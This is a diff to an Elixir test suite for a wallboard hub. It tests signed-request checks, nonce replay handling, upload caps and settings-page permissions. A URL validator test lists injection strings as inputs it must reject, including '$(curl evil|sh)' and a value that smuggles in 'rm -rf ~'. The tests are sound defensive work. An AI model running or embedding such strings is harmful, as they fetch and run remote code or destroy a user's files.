@@ -310,29 +310,43 @@ defmodule Wallboard.MachineKeysTest do
       |> Plug.Conn.put_req_header("x-vitalaize-signature", sig)
     end
 
-    test "a copy of a request is refused before its body is read, however slowly either comes" do
+    test "a copy of a request is refused, however slowly either comes, and an unsigned one writes nothing" do
       dir = tmp_dir()
       hub(dir)
       {id, key} = Fixtures.connect_machine(Path.join(dir, "a"), "laptop")
       t = System.os_time(:second)
       conn = signed_conn("/ingest/status?machine=laptop", "{}", id, key, to_string(t))
 
-      # The nonce is claimed with the headers, on the database's own clock.
-      assert {:ok, parts} = MachineKeys.precheck(conn, t)
-      assert {:error, 401, "this request was already sent once"} = MachineKeys.precheck(conn, t)
+      # Nothing is kept for a request until its signature checks out.
+      assert {:ok, _} = MachineKeys.precheck(conn)
+      assert {:ok, parts} = MachineKeys.precheck(conn)
+      bad = %{parts | signature: String.duplicate("0", 64)}
+      assert {:error, 401, "wrong signature"} = MachineKeys.verify(conn, bad, "{}")
+      assert Store.query("SELECT * FROM seen_requests", []) == []
 
-      # A body that comes long after its headers is still taken: a slow
-      # network is not refused for being slow.
-      assert MachineKeys.verify(conn, parts, "{}", t + 900) == {:ok, "laptop"}
+      # Then taken once; its copy is refused.
+      assert MachineKeys.verify(conn, parts, "{}") == {:ok, "laptop"}
 
-      # And one signed more than five minutes ago is refused, whatever the
-      # caller's own idea of the time.
+      assert {:error, 401, "this request was already sent once"} =
+               MachineKeys.verify(conn, parts, "{}")
+
+      # A nonce is kept past the window for as long as the slowest body may
+      # take, so a copy that started inside the window and came slowly is
+      # still refused; one signed before all that is refused as stale.
+      keep = MachineKeys.keep_nonces()
+      assert keep >= MachineKeys.window() + MachineKeys.upload_deadline()
+      slow = t - MachineKeys.window() - MachineKeys.upload_deadline()
+      assert Store.claim_nonce(id, "aaaa0000aaaa0000", slow, MachineKeys.window(), keep) == :ok
+      assert Store.claim_nonce(id, "aaaa0000aaaa0000", slow, MachineKeys.window(), keep) == :seen
+
+      assert Store.claim_nonce(id, "bbbb0000bbbb0000", t - keep - 5, MachineKeys.window(), keep) ==
+               :stale
+
+      assert Store.claim_nonce(id, "cccc0000cccc0000", t + 400, MachineKeys.window(), keep) ==
+               :stale
+
       old = signed_conn("/ingest/status?machine=laptop", "{}", id, key, to_string(t - 301))
-
-      assert {:error, 401, "request time is more than 5 minutes" <> _} =
-               MachineKeys.precheck(old, t - 290)
-
-      assert Store.claim_nonce(id, "fedcba9876543210", t - 301, MachineKeys.window()) == :stale
+      assert {:error, 401, "request time is more than 5 minutes" <> _} = MachineKeys.precheck(old)
     end
 
     test "a machine disconnected while its upload is on the way is refused" do
@@ -342,7 +356,7 @@ defmodule Wallboard.MachineKeysTest do
       t = System.os_time(:second)
       conn = signed_conn("/ingest/status?machine=laptop", "{}", id, key, to_string(t))
 
-      assert {:ok, parts} = MachineKeys.precheck(conn, t)
+      assert {:ok, parts} = MachineKeys.precheck(conn)
       MachineKeys.revoke(id)
 
       assert MachineKeys.verify(conn, parts, "{}", t) ==
@@ -429,13 +443,143 @@ defmodule Wallboard.MachineKeysTest do
     end
   end
 
+  describe "upload limits" do
+    alias Wallboard.Archive.UploadGate
+
+    test "unchecked uploads are capped per key and in all, and let go when their process ends" do
+      start_supervised!(UploadGate)
+      parent = self()
+
+      # Holds a place from its own process until told to stop.
+      hold = fn key, bytes ->
+        spawn(fn ->
+          send(parent, {:admitted, self(), UploadGate.admit(key, bytes)})
+
+          receive do
+            :stop -> :ok
+          end
+        end)
+      end
+
+      admitted = fn pid ->
+        receive do
+          {:admitted, ^pid, result} -> result
+        end
+      end
+
+      a1 = hold.("k1", 100)
+      assert admitted.(a1) == :ok
+      a2 = hold.("k1", 100)
+      assert admitted.(a2) == :ok
+      # A third from the same key waits for the next turn.
+      a3 = hold.("k1", 100)
+      assert {:error, "this machine is already sending" <> _} = admitted.(a3)
+
+      # Past 2 GB in all, from any key.
+      big = hold.("k2", 1_999_999_900)
+      assert {:error, "the hub is busy" <> _} = admitted.(big)
+
+      # A holder that dies gives its place back.
+      Process.exit(a1, :kill)
+      Process.sleep(50)
+      a4 = hold.("k1", 100)
+      assert admitted.(a4) == :ok
+      big = hold.("k2", 1_000_000_000)
+      assert admitted.(big) == :ok
+    end
+
+    test "only two checked uploads unpack at once; the next waits its turn" do
+      start_supervised!(UploadGate)
+      parent = self()
+
+      unpack = fn name ->
+        spawn(fn ->
+          UploadGate.unpack(fn ->
+            send(parent, {:started, name})
+
+            receive do
+              :done -> :ok
+            end
+          end)
+        end)
+      end
+
+      pids = %{a: unpack.(:a), b: unpack.(:b), c: unpack.(:c)}
+
+      # Two start, in whatever order they asked; the third waits.
+      started =
+        for _ <- 1..2 do
+          assert_receive {:started, name}
+          name
+        end
+
+      refute_receive {:started, _}, 200
+
+      send(pids[hd(started)], :done)
+      [waiting] = Map.keys(pids) -- started
+      assert_receive {:started, ^waiting}
+    end
+
+    test "an upload is kept in a folder only this user can open, and is gone once saved" do
+      dir = tmp_dir()
+      url = hub(dir)
+      {id, key} = Fixtures.connect_machine(Path.join(dir, "a"), "laptop")
+
+      assert {"422", "not a .tar.gz"} =
+               Fixtures.signed_post(url, "/ingest/transcript?machine=laptop", "x", id, key)
+
+      incoming = Path.join(dir, "incoming")
+      assert Bitwise.band(File.stat!(incoming).mode, 0o777) == 0o700
+      assert File.ls!(incoming) == []
+    end
+
+    test "an upload that does not say its length is refused before it is read" do
+      dir = tmp_dir()
+      url = hub(dir)
+      {id, key} = Fixtures.connect_machine(Path.join(dir, "a"), "laptop")
+      t = to_string(System.os_time(:second))
+      nonce = "0123456789abcdef"
+
+      sig =
+        MachineKeys.hmac(
+          key,
+          MachineKeys.message("POST", "/ingest/transcript", "machine=laptop", t, nonce, "x")
+        )
+
+      {out, 0} =
+        System.cmd("curl", [
+          "-s",
+          "-w",
+          "\n%{http_code}",
+          "-H",
+          "Transfer-Encoding: chunked",
+          "-H",
+          "Content-Type: application/gzip",
+          "-H",
+          "X-Vitalaize-Key: #{id}",
+          "-H",
+          "X-Vitalaize-Time: #{t}",
+          "-H",
+          "X-Vitalaize-Nonce: #{nonce}",
+          "-H",
+          "X-Vitalaize-Signature: #{sig}",
+          "--data-binary",
+          "x",
+          url <> "/ingest/transcript?machine=laptop"
+        ])
+
+      assert out == "say how long the upload is\n\n411"
+    end
+  end
+
   describe "the settings page" do
-    defp page(local? \\ true) do
+    defp page(local? \\ true, keys? \\ true) do
       socket = %Phoenix.LiveView.Socket{
         assigns: %{
           __changed__: %{},
           allowed?: true,
           local?: local?,
+          keys?: local? and keys?,
           connected?: true,
           errors: %{},
           notice: nil,
@@ -518,13 +662,19 @@ defmodule Wallboard.MachineKeysTest do
             "http://h:4747/$(curl evil|sh)",
             ~s(http://h:4747"; rm -rf ~; "),
             "http://h:4747\nexit",
-            "http://h:4747/x",
+            "http://h:4747/x?y=1",
+            "http://h:4747/it's",
             "ftp://h"
           ] do
         refute Settings.hub_url?(bad), bad
       end
 
-      for good <- ["http://192.168.1.20:4747", "https://hub.local", "http://[fe80::1]:4747/"] do
+      for good <- [
+            "http://192.168.1.20:4747",
+            "https://hub.local",
+            "http://[fe80::1]:4747/",
+            "https://box.local/wallboard"
+          ] do
         assert Settings.hub_url?(good), good
       end
 
@@ -539,6 +689,32 @@ defmodule Wallboard.MachineKeysTest do
       values = Map.put(socket.assigns.values, "archive.hub_url", "http://10.0.0.9:4747")
       {:noreply, _} = SettingsLive.handle_event("save", %{"s" => values}, socket)
       assert saved.() =~ "http://10.0.0.9:4747"
+    end
+
+    test "on this Mac too, the key and the address need the board's password" do
+      dir = tmp_dir()
+      hub(dir)
+      {laptop, _} = Fixtures.connect_machine(Path.join(dir, "a"), "laptop")
+      # This Mac, but no password: any account on it could be here.
+      socket = page(true, false)
+
+      for event <- ~w(toggle_key new_key) do
+        assert {:noreply, ^socket} = SettingsLive.handle_event(event, %{}, socket)
+      end
+
+      {:noreply, socket} = SettingsLive.handle_event("disconnect", %{"key" => laptop}, socket)
+      {:noreply, socket} = SettingsLive.handle_event("disconnect", %{"key" => laptop}, socket)
+      assert [_] = MachineKeys.list()
+
+      page = html(socket)
+      assert page =~ "Give the board a password first"
+      refute page =~ "/ingest/install.sh"
+      refute page =~ MachineKeys.connect_key()
+      refute page =~ ~s(phx-click="disconnect")
+
+      values = Map.put(socket.assigns.values, "archive.hub_url", "http://10.0.0.9:4747")
+      {:noreply, _} = SettingsLive.handle_event("save", %{"s" => values}, socket)
+      refute (Store.get_meta("settings_overrides") || "") =~ "10.0.0.9"
     end
 
     test "another device, even with the board's password, cannot see the key or disconnect" do
